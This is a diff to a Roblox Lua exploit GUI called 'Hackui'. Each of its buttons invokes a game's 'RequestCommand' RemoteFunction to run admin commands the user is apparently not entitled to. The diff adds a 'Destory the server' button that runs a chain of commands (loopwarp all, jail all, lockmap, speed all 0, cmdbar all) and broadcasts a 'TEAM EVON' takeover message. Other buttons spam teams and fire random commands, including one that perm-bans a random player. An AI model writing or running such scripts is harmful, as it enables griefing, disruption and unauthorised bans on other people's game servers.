@@ -24,44 +24,47 @@ local TimerButton = Instance.new("TextButton")
 local UICorner_9 = Instance.new("UICorner")
 local Gears = Instance.new("TextButton")
 local UICorner_10 = Instance.new("UICorner")
-local OC = Instance.new("TextButton")
+local DS = Instance.new("TextButton")
 local UICorner_11 = Instance.new("UICorner")
-local MusicFrame = Instance.new("Frame")
+local OC = Instance.new("TextButton")
 local UICorner_12 = Instance.new("UICorner")
+local MusicFrame = Instance.new("Frame")
+local UICorner_13 = Instance.new("UICorner")
 local Musicholder = Instance.new("ScrollingFrame")
 local Music = Instance.new("TextButton")
-local UICorner_13 = Instance.new("UICorner")
+local UICorner_14 = Instance.new("UICorner")
 local UIListLayout = Instance.new("UIListLayout")
 local Music_2 = Instance.new("TextButton")
-local UICorner_14 = Instance.new("UICorner")
-local Music_3 = Instance.new("TextButton")
 local UICorner_15 = Instance.new("UICorner")
+local Music_3 = Instance.new("TextButton")
+local UICorner_16 = Instance.new("UICorner")
 local Timer = Instance.new("Frame")
 local Line = Instance.new("Frame")
-local UICorner_16 = Instance.new("UICorner")
+local UICorner_17 = Instance.new("UICorner")
 local TimerText = Instance.new("TextLabel")
 local Text = Instance.new("TextLabel")
 local TimerMenu = Instance.new("Frame")
-local UICorner_17 = Instance.new("UICorner")
-local TimerText_2 = Instance.new("TextBox")
 local UICorner_18 = Instance.new("UICorner")
-local RunTimer = Instance.new("TextButton")
+local TimerText_2 = Instance.new("TextBox")
 local UICorner_19 = Instance.new("UICorner")
-local GearFrame = Instance.new("Frame")
+local RunTimer = Instance.new("TextButton")
 local UICorner_20 = Instance.new("UICorner")
+local GearFrame = Instance.new("Frame")
+local UICorner_21 = Instance.new("UICorner")
 local Gearholder = Instance.new("ScrollingFrame")
 local Gear = Instance.new("TextButton")
-local UICorner_21 = Instance.new("UICorner")
+local UICorner_22 = Instance.new("UICorner")
 local UIListLayout_2 = Instance.new("UIListLayout")
 local Gear_2 = Instance.new("TextButton")
-local UICorner_22 = Instance.new("UICorner")
-local Gear_3 = Instance.new("TextButton")
 local UICorner_23 = Instance.new("UICorner")
-local Drag Instance.new("UIDragDetector", Timer)
+local Gear_3 = Instance.new("TextButton")
+local UICorner_24 = Instance.new("UICorner")
+
 --Properties:
 
 Hackui.Name = "Hackui"
 Hackui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Hackui.Enabled = false
 Hackui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Hackui.ResetOnSpawn = false
 
@@ -81,7 +84,7 @@ AT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 AT.BackgroundTransparency = 1.000
 AT.BorderColor3 = Color3.fromRGB(0, 0, 0)
 AT.BorderSizePixel = 0
-AT.Size = UDim2.new(1, 0, 0.0848896429, 0)
+AT.Size = UDim2.new(1, 0, 0.0645161271, 0)
 AT.Font = Enum.Font.SourceSans
 AT.Text = "spam teams"
 AT.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -97,8 +100,8 @@ RT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 RT.BackgroundTransparency = 1.000
 RT.BorderColor3 = Color3.fromRGB(0, 0, 0)
 RT.BorderSizePixel = 0
-RT.Position = UDim2.new(0, 0, 0.103782251, 0)
-RT.Size = UDim2.new(1, 0, 0.0848896429, 0)
+RT.Position = UDim2.new(0, 0, 0.0766175687, 0)
+RT.Size = UDim2.new(1, 0, 0.0628183335, 0)
 RT.Font = Enum.Font.SourceSans
 RT.Text = "remove teams"
 RT.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -114,8 +117,8 @@ PM.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 PM.BackgroundTransparency = 1.000
 PM.BorderColor3 = Color3.fromRGB(0, 0, 0)
 PM.BorderSizePixel = 0
-PM.Position = UDim2.new(0, 0, 0.21096009, 0)
-PM.Size = UDim2.new(1, 0, 0.0848896429, 0)
+PM.Position = UDim2.new(0, 0, 0.156630725, 0)
+PM.Size = UDim2.new(1, 0, 0.0543293729, 0)
 PM.Font = Enum.Font.SourceSans
 PM.Text = "play music"
 PM.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -131,8 +134,8 @@ SF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 SF.BackgroundTransparency = 1.000
 SF.BorderColor3 = Color3.fromRGB(0, 0, 0)
 SF.BorderSizePixel = 0
-SF.Position = UDim2.new(0, 0, 0.317921072, 0)
-SF.Size = UDim2.new(1, 0, 0.0848896429, 0)
+SF.Position = UDim2.new(0, 0, 0.221146867, 0)
+SF.Size = UDim2.new(1, 0, 0.0543293729, 0)
 SF.Font = Enum.Font.SourceSans
 SF.Text = "sword fight"
 SF.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -148,8 +151,8 @@ SRC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 SRC.BackgroundTransparency = 1.000
 SRC.BorderColor3 = Color3.fromRGB(0, 0, 0)
 SRC.BorderSizePixel = 0
-SRC.Position = UDim2.new(0, 0, 0.423184186, 0)
-SRC.Size = UDim2.new(1, 0, 0.0848896429, 0)
+SRC.Position = UDim2.new(0, 0, 0.294151932, 0)
+SRC.Size = UDim2.new(1, 0, 0.0492359921, 0)
 SRC.Font = Enum.Font.SourceSans
 SRC.Text = "spam random commands"
 SRC.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -199,8 +202,8 @@ TimerButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TimerButton.BackgroundTransparency = 1.000
 TimerButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TimerButton.BorderSizePixel = 0
-TimerButton.Position = UDim2.new(0, 0, 0.526749551, 0)
-TimerButton.Size = UDim2.new(1, 0, 0.0848896429, 0)
+TimerButton.Position = UDim2.new(0, 0, 0.360365868, 0)
+TimerButton.Size = UDim2.new(1, 0, 0.0441426151, 0)
 TimerButton.Font = Enum.Font.SourceSans
 TimerButton.Text = "TimerMenu"
 TimerButton.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -216,8 +219,8 @@ Gears.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Gears.BackgroundTransparency = 1.000
 Gears.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Gears.BorderSizePixel = 0
-Gears.Position = UDim2.new(0, 0, 0.628617108, 0)
-Gears.Size = UDim2.new(1, 0, 0.0848896429, 0)
+Gears.Position = UDim2.new(0, 0, 0.421486348, 0)
+Gears.Size = UDim2.new(1, 0, 0.0492359921, 0)
 Gears.Font = Enum.Font.SourceSans
 Gears.Text = "Gears"
 Gears.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -226,6 +229,23 @@ Gears.TextSize = 14.000
 Gears.TextWrapped = true
 
 UICorner_10.Parent = Gears
+
+DS.Name = "DS"
+DS.Parent = MainFrame
+DS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DS.BackgroundTransparency = 1.000
+DS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+DS.BorderSizePixel = 0
+DS.Position = UDim2.new(0, 0, 0.487700284, 0)
+DS.Size = UDim2.new(1, 0, 0.0492359921, 0)
+DS.Font = Enum.Font.SourceSans
+DS.Text = "Destory the server"
+DS.TextColor3 = Color3.fromRGB(0, 0, 0)
+DS.TextScaled = true
+DS.TextSize = 14.000
+DS.TextWrapped = true
+
+UICorner_11.Parent = DS
 
 OC.Name = "O/C"
 OC.Parent = Hackui
@@ -241,18 +261,18 @@ OC.TextScaled = true
 OC.TextSize = 14.000
 OC.TextWrapped = true
 
-UICorner_11.Parent = OC
+UICorner_12.Parent = OC
 
 MusicFrame.Name = "MusicFrame"
 MusicFrame.Parent = Hackui
 MusicFrame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
 MusicFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 MusicFrame.BorderSizePixel = 0
-MusicFrame.Position = UDim2.new(0.424770653, 0, 0.191850588, 0)
+MusicFrame.Position = UDim2.new(0.423815519, 0, 0.0764006823, 0)
 MusicFrame.Size = UDim2.new(0.283486247, 0, 0.628183365, 0)
 MusicFrame.Visible = false
 
-UICorner_12.Parent = MusicFrame
+UICorner_13.Parent = MusicFrame
 
 Musicholder.Name = "Musicholder"
 Musicholder.Parent = MusicFrame
@@ -278,7 +298,7 @@ Music.TextScaled = true
 Music.TextSize = 14.000
 Music.TextWrapped = true
 
-UICorner_13.Parent = Music
+UICorner_14.Parent = Music
 
 UIListLayout.Parent = Musicholder
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
@@ -298,7 +318,7 @@ Music_2.TextScaled = true
 Music_2.TextSize = 14.000
 Music_2.TextWrapped = true
 
-UICorner_14.Parent = Music_2
+UICorner_15.Parent = Music_2
 
 Music_3.Name = "Music"
 Music_3.Parent = Musicholder
@@ -315,7 +335,7 @@ Music_3.TextScaled = true
 Music_3.TextSize = 14.000
 Music_3.TextWrapped = true
 
-UICorner_15.Parent = Music_3
+UICorner_16.Parent = Music_3
 
 Timer.Name = "Timer"
 Timer.Parent = Hackui
@@ -333,7 +353,7 @@ Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Line.BorderSizePixel = 0
 Line.Size = UDim2.new(1, 0, 0.172043011, 0)
 
-UICorner_16.Parent = Timer
+UICorner_17.Parent = Timer
 
 TimerText.Name = "TimerText"
 TimerText.Parent = Timer
@@ -368,11 +388,11 @@ TimerMenu.Parent = Hackui
 TimerMenu.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
 TimerMenu.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TimerMenu.BorderSizePixel = 0
-TimerMenu.Position = UDim2.new(0.442201853, 0, 0.580645144, 0)
-TimerMenu.Size = UDim2.new(0.27889207, 0, 0.179966047, 0)
+TimerMenu.Position = UDim2.new(0.442201853, 0, 0.361629874, 0)
+TimerMenu.Size = UDim2.new(0.27889207, 0, 0.115449913, 0)
 TimerMenu.Visible = false
 
-UICorner_17.Parent = TimerMenu
+UICorner_18.Parent = TimerMenu
 
 TimerText_2.Name = "TimerText"
 TimerText_2.Parent = TimerMenu
@@ -388,7 +408,7 @@ TimerText_2.Text = ""
 TimerText_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 TimerText_2.TextSize = 14.000
 
-UICorner_18.Parent = TimerText_2
+UICorner_19.Parent = TimerText_2
 
 RunTimer.Name = "RunTimer"
 RunTimer.Parent = TimerMenu
@@ -396,7 +416,7 @@ RunTimer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 RunTimer.BackgroundTransparency = 1.000
 RunTimer.BorderColor3 = Color3.fromRGB(0, 0, 0)
 RunTimer.BorderSizePixel = 0
-RunTimer.Position = UDim2.new(0, 0, 0.678283095, 0)
+RunTimer.Position = UDim2.new(-0.00342465751, 0, 0.66884917, 0)
 RunTimer.Size = UDim2.new(1, 0, 0.321718723, 0)
 RunTimer.Font = Enum.Font.SourceSans
 RunTimer.Text = "Excute"
@@ -405,7 +425,7 @@ RunTimer.TextScaled = true
 RunTimer.TextSize = 14.000
 RunTimer.TextWrapped = true
 
-UICorner_19.Parent = RunTimer
+UICorner_20.Parent = RunTimer
 
 GearFrame.Name = "GearFrame"
 GearFrame.Parent = Hackui
@@ -416,7 +436,7 @@ GearFrame.Position = UDim2.new(0.424770653, 0, 0.191850588, 0)
 GearFrame.Size = UDim2.new(0.283486247, 0, 0.628183365, 0)
 GearFrame.Visible = false
 
-UICorner_20.Parent = GearFrame
+UICorner_21.Parent = GearFrame
 
 Gearholder.Name = "Gearholder"
 Gearholder.Parent = GearFrame
@@ -442,7 +462,7 @@ Gear.TextScaled = true
 Gear.TextSize = 14.000
 Gear.TextWrapped = true
 
-UICorner_21.Parent = Gear
+UICorner_22.Parent = Gear
 
 UIListLayout_2.Parent = Gearholder
 UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
@@ -462,7 +482,7 @@ Gear_2.TextScaled = true
 Gear_2.TextSize = 14.000
 Gear_2.TextWrapped = true
 
-UICorner_22.Parent = Gear_2
+UICorner_23.Parent = Gear_2
 
 Gear_3.Name = "Gear"
 Gear_3.Parent = Gearholder
@@ -479,7 +499,7 @@ Gear_3.TextScaled = true
 Gear_3.TextSize = 14.000
 Gear_3.TextWrapped = true
 
-UICorner_23.Parent = Gear_3
+UICorner_24.Parent = Gear_3
 
 Music:SetAttribute("id", 142376088)
 Music_2:SetAttribute("id", 1837768745)
@@ -500,6 +520,36 @@ end
 Music.MouseButton1Click:Connect(function()
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";music 142376088") end end
 	MusicFrame.Visible = false
+end)
+
+DS.MouseButton1Click:Connect(function()
+	timer(5)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";sh TEAM EVON HAS TAKEN OVER THE SERVER!") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";loopwarp all") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";blur all") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";music 10418150898048") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";disco") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";jail all ;ice all ;lockmap") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";fat all") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";speed all 0") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";alert all TEAM EVON HAS TAKEN OVER THE SERVER!") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";cmdbar all ;cmdbar2 all") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";servermessage TEAM EVON HAS TAKEN OVER THE SERVER!") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";name all TEAM EVON!") end end
+	timer(1)
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";titler all TEAM EVON HAS TAKEN OVER THE SERVER!") end end
+	timer(1)
 end)
 
 TimerButton.MouseButton1Click:Connect(function()
@@ -553,33 +603,33 @@ for i,v in Hackui:GetDescendants() do
 end
 
 AT.MouseButton1Click:Connect(function()
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam Red join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam Red join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam Orange join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam Orange join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam yellow join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam yellow join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam green join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam green join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam darkgreen join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam darkgreen join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam blue join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam blue join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam darkblue join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam darkblue join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam pink join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam pink join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam purple join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam purple join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam brown join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam brown join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam grey join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam grey join team Evon today!") end end
 	task.wait(0.25)
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam black join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";createteam black join team Evon today!") end end
 end)
 
 RT.MouseButton1Click:Connect(function()
-	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";removeteam join Evon team today!") end end
+	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";removeteam join team Evon today!") end end
 end)
 
 SF.MouseButton1Click:Connect(function() 
@@ -613,7 +663,7 @@ SRC.MouseButton1Click:Connect(function()
 		if math.random(1,10) == 1 then
 			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";re all") end end
 		elseif math.random(1,10) == 2 then
-			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";sh EVON join today!") end end
+			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";sh join team EVON today!") end end
 		elseif math.random(1,10) == 3 then
 			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";pm all hello this was a random command") end end
 		elseif math.random(1,10) == 4 then
@@ -621,7 +671,7 @@ SRC.MouseButton1Click:Connect(function()
 		elseif math.random(1,10) == 5 then
 			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";permrank random Ban") end end
 		elseif math.random(1,10) == 6 then
-			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";servermessage EVON join today!") end end
+			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";servermessage join team EVON today!") end end
 		elseif math.random(1,10) == 7 then
 			for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";warp all") end end
 		elseif math.random(1,10) == 8 then
